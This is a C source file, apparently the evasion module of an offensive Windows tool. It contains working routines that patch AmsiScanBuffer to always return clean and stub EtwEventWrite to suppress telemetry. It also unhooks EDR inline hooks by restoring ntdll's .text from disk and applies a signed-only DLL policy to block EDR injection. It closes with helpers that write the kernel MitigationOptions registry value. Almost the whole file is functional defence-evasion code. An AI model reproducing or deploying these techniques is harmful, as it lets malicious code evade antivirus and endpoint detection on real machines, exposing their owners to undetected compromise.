#include "../../include/utils/evasion.h"
#include "../../include/utils/registry.h"
#include <string.h>

// ── Kernel MitigationOptions constants ───────────────────────────────────────
// Defined locally so evasion.c has no dependency on core/common.h.

#define MITIGATION_OPTIONS_PATH \
  "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel"
#define MITIGATION_OPTIONS_VALUE "MitigationOptions"
#define MITIGATION_OPTIONS_SIZE  20

// Byte 5 = 0x10: MicrosoftSignedOnly — only Microsoft-signed kernel modules
static const BYTE MITIGATION_MICROSOFT_SIGNED_ONLY[MITIGATION_OPTIONS_SIZE] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Byte 5 = 0x20: WindowsSignedOnly — standard WHQL-signed drivers permitted
static const BYTE MITIGATION_DEFAULT[MITIGATION_OPTIONS_SIZE] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Guard definitions that may be missing from older MinGW-w64 SDK headers.
#ifndef ProcessSignaturePolicy
// PROCESS_MITIGATION_POLICY enum value 8
#define ProcessSignaturePolicy 8
#endif

#ifndef PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_DEFINED
typedef struct {
  union {
    DWORD Flags;
    struct {
      DWORD MicrosoftSignedOnly  : 1;
      DWORD StoreSignedOnly      : 1;
      DWORD MitigationOptIn      : 1;
      DWORD AuditMicrosoftSignedOnly : 1;
      DWORD AuditStoreSignedOnly : 1;
      DWORD ReservedFlags        : 27;
    };
  };
} PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_COMPAT;
#define PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_DEFINED
#endif

// SetProcessMitigationPolicy loaded dynamically for Windows 7 compatibility.
typedef BOOL (WINAPI *pfnSetProcessMitigationPolicy)(
    DWORD MitigationPolicy, PVOID lpBuffer, SIZE_T dwLength);

//////////////////////////////////////////////////////////////
// Internal Helpers //////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Overwrite the first `patch_len` bytes of a function with patch bytes,
 * temporarily making the page PAGE_EXECUTE_READWRITE.
 *
 * @param module:     DLL name passed to GetModuleHandleA
 * @param func_name:  Exported function name
 * @param patch:      Replacement bytes
 * @param patch_len:  Number of bytes to write
 * @return: 0 on success, -1 on failure
 */
static int patch_function(const char *module, const char *func_name,
                           const BYTE *patch, SIZE_T patch_len) {
  HMODULE hMod = GetModuleHandleA(module);
  if (!hMod) {
    // Try loading if not already mapped
    hMod = LoadLibraryA(module);
    if (!hMod) {
      pretty_print(LOG_ERROR, "patch_function: %s not loaded: %lu",
                   module, GetLastError());
      return -1;
    }
  }

  FARPROC fn = GetProcAddress(hMod, func_name);
  if (!fn) {
    pretty_print(LOG_ERROR, "patch_function: %s!%s not found: %lu",
                 module, func_name, GetLastError());
    return -1;
  }

  DWORD old_protect;
  if (!VirtualProtect((LPVOID)fn, patch_len, PAGE_EXECUTE_READWRITE,
                      &old_protect)) {
    pretty_print(LOG_ERROR,
                 "patch_function: VirtualProtect(%s!%s) failed: %lu",
                 module, func_name, GetLastError());
    return -1;
  }

  memcpy((LPVOID)fn, patch, patch_len);
  FlushInstructionCache(GetCurrentProcess(), (LPVOID)fn, patch_len);
  VirtualProtect((LPVOID)fn, patch_len, old_protect, &old_protect);

  pretty_print(LOG_SUCCESS, "patch_function: %s!%s patched (%zu bytes)",
               module, func_name, patch_len);
  return 0;
}

//////////////////////////////////////////////////////////////
// AMSI Patch ////////////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN (0).
 *
 * x64 patch: xor eax, eax (31 C0) ; ret (C3) — 3 bytes.
 * The function returns an HRESULT; returning 0 (S_OK) with a clean result
 * satisfies all AMSI consumers without triggering a scan alert.
 */
int patch_amsi(void) {
  // xor eax, eax; ret
  const BYTE patch[] = {0x31, 0xC0, 0xC3};
  return patch_function("amsi.dll", "AmsiScanBuffer", patch, sizeof(patch));
}

//////////////////////////////////////////////////////////////
// ETW Patch /////////////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Stub EtwEventWrite in ntdll to suppress ETW event emission from this process.
 *
 * x64 patch: xor eax, eax (31 C0) ; ret (C3).
 * EtwEventWrite is the low-level sink for all ETW providers. Patching it
 * prevents the Windows kernel's ETW-TI (Threat Intelligence) pipeline from
 * receiving process, thread, image-load, and network events from this process.
 *
 * Note: kernel-level ETW (from ETW kernel providers / kernel callbacks) is
 * unaffected. This only disables user-mode event emission.
 */
int patch_etw(void) {
  const BYTE patch[] = {0x31, 0xC0, 0xC3};
  return patch_function("ntdll.dll", "EtwEventWrite", patch, sizeof(patch));
}

//////////////////////////////////////////////////////////////
// ntdll Unhooking ///////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Reload ntdll from disk and overwrite the in-memory .text section,
 * removing any inline hooks (5-byte JMP splices, hot-patches, etc.)
 * placed by EDR/AV products at process start.
 *
 * SEC_IMAGE maps the DLL the same way the loader does (sections at their
 * VirtualAddress offsets from the mapping base), so a direct memcpy of the
 * .text RVA range is valid.
 */
int unhook_ntdll(void) {
  // ── 1. Locate the loaded ntdll and get its path ───────────────────────────
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (!hNtdll) {
    pretty_print(LOG_ERROR, "unhook_ntdll: ntdll.dll not loaded");
    return -1;
  }

  char path[MAX_PATH];
  if (!GetModuleFileNameA(hNtdll, path, sizeof(path))) {
    pretty_print(LOG_ERROR, "unhook_ntdll: GetModuleFileName failed: %lu",
                 GetLastError());
    return -1;
  }

  // ── 2. Open and map the on-disk copy with SEC_IMAGE ───────────────────────
  HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    pretty_print(LOG_ERROR, "unhook_ntdll: CreateFile('%s') failed: %lu",
                 path, GetLastError());
    return -1;
  }

  // SEC_IMAGE tells the mapping subsystem to honour PE section alignments
  // and relocations, producing a layout identical to a loader-mapped image.
  HANDLE hMapping = CreateFileMappingA(hFile, NULL,
                                       PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
  CloseHandle(hFile);
  if (!hMapping) {
    pretty_print(LOG_ERROR,
                 "unhook_ntdll: CreateFileMapping failed: %lu", GetLastError());
    return -1;
  }

  LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
  CloseHandle(hMapping);
  if (!pClean) {
    pretty_print(LOG_ERROR, "unhook_ntdll: MapViewOfFile failed: %lu",
                 GetLastError());
    return -1;
  }

  // ── 3. Walk PE headers to find the .text section ──────────────────────────
  PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
  PIMAGE_NT_HEADERS pNt  =
      (PIMAGE_NT_HEADERS)((BYTE *)pClean + pDos->e_lfanew);
  PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

  int patched = 0;
  for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
    if (memcmp(pSec->Name, ".text", 5) != 0) continue;

    LPVOID dest = (BYTE *)hNtdll + pSec->VirtualAddress;  // live .text
    LPVOID src  = (BYTE *)pClean + pSec->VirtualAddress;  // clean .text
    SIZE_T size = pSec->Misc.VirtualSize;

    DWORD old_protect;
    if (!VirtualProtect(dest, size, PAGE_EXECUTE_READWRITE, &old_protect)) {
      pretty_print(LOG_ERROR,
                   "unhook_ntdll: VirtualProtect(.text) failed: %lu",
                   GetLastError());
      UnmapViewOfFile(pClean);
      return -1;
    }

    memcpy(dest, src, size);
    FlushInstructionCache(GetCurrentProcess(), dest, size);
    VirtualProtect(dest, size, old_protect, &old_protect);

    pretty_print(LOG_SUCCESS,
                 "unhook_ntdll: .text restored — %zu bytes overwritten at %p",
                 size, dest);
    patched = 1;
    break;
  }

  UnmapViewOfFile(pClean);

  if (!patched) {
    pretty_print(LOG_ERROR, "unhook_ntdll: .text section not found in PE");
    return -1;
  }

  return 0;
}

//////////////////////////////////////////////////////////////
// Process-Level Block-DLL Mitigation ////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Apply MicrosoftSignedOnly binary signature policy to the current process.
 *
 * SetProcessMitigationPolicy is loaded dynamically so the binary does not
 * hard-fail on Windows 7 where the API does not exist.
 *
 * Once applied, the kernel refuses to map any image not signed by Microsoft
 * into this process — this prevents EDR/AV DLL injection for the remainder
 * of the process lifetime.
 */
int enable_blockdlls(void) {
  pfnSetProcessMitigationPolicy fn =
      (pfnSetProcessMitigationPolicy)GetProcAddress(
          GetModuleHandleA("kernel32.dll"), "SetProcessMitigationPolicy");
  if (!fn) {
    pretty_print(LOG_ERROR,
                 "enable_blockdlls: SetProcessMitigationPolicy not available "
                 "(requires Windows 8+)");
    return -1;
  }

  PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_COMPAT policy;
  memset(&policy, 0, sizeof(policy));
  policy.MicrosoftSignedOnly = 1;

  if (!fn(ProcessSignaturePolicy, &policy, sizeof(policy))) {
    pretty_print(LOG_ERROR,
                 "enable_blockdlls: SetProcessMitigationPolicy failed: %lu",
                 GetLastError());
    return -1;
  }

  pretty_print(LOG_SUCCESS,
               "enable_blockdlls: MicrosoftSignedOnly policy active on "
               "current process (permanent for process lifetime)");
  return 0;
}

//////////////////////////////////////////////////////////////
// Kernel MitigationOptions Registry Policy //////////////////
//////////////////////////////////////////////////////////////

/**
 * Enforce Microsoft-signed-only kernel module loading via the registry.
 *
 * Writes HKLM\...\kernel\MitigationOptions (byte 5 = 0x10).
 * Reads and prints the current value first, then verifies the write.
 * Requires HKLM write access (administrator).
 * Takes effect after the next reboot (or kernel policy refresh).
 */
int set_mitigation_policy(void) {
  if (registry_value_exists(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                            MITIGATION_OPTIONS_VALUE)) {
    DWORD size;
    BYTE *cur = get_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                                 MITIGATION_OPTIONS_VALUE, &size, NULL);
    if (cur) {
      pretty_print(LOG_INFO, "set_mitigation_policy: current value:");
      print_binary_data(cur, size);
      free(cur);
    }
  } else {
    pretty_print(LOG_INFO,
                 "set_mitigation_policy: value absent — will create it");
  }

  if (set_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                       MITIGATION_OPTIONS_VALUE,
                       MITIGATION_MICROSOFT_SIGNED_ONLY,
                       MITIGATION_OPTIONS_SIZE, REG_BINARY) != 0) {
    pretty_print(LOG_ERROR, "set_mitigation_policy: write failed");
    return -1;
  }

  DWORD size;
  BYTE *ver = get_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                               MITIGATION_OPTIONS_VALUE, &size, NULL);
  if (!ver) {
    pretty_print(LOG_ERROR, "set_mitigation_policy: verification read failed");
    return -1;
  }
  pretty_print(LOG_SUCCESS, "set_mitigation_policy: value written and verified:");
  print_binary_data(ver, size);
  free(ver);
  return 0;
}

/**
 * Reset MitigationOptions to the Windows default (WHQL-signed, byte 5 = 0x20).
 * No-op if the value does not exist.
 */
int unset_mitigation_policy(void) {
  if (!registry_value_exists(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                             MITIGATION_OPTIONS_VALUE)) {
    pretty_print(LOG_INFO, "unset_mitigation_policy: value absent — nothing to do");
    return 0;
  }

  DWORD size;
  BYTE *cur = get_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                               MITIGATION_OPTIONS_VALUE, &size, NULL);
  if (cur) {
    pretty_print(LOG_INFO, "unset_mitigation_policy: current value:");
    print_binary_data(cur, size);
    free(cur);
  }

  if (set_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                       MITIGATION_OPTIONS_VALUE,
                       MITIGATION_DEFAULT,
                       MITIGATION_OPTIONS_SIZE, REG_BINARY) != 0) {
    pretty_print(LOG_ERROR, "unset_mitigation_policy: write failed");
    return -1;
  }

  BYTE *ver = get_registry_key(HKEY_LOCAL_MACHINE, MITIGATION_OPTIONS_PATH,
                               MITIGATION_OPTIONS_VALUE, &size, NULL);
  if (!ver) {
    pretty_print(LOG_ERROR, "unset_mitigation_policy: verification read failed");
    return -1;
  }
  pretty_print(LOG_SUCCESS,
               "unset_mitigation_policy: value reset to default and verified:");
  print_binary_data(ver, size);
  free(ver);
  return 0;
}
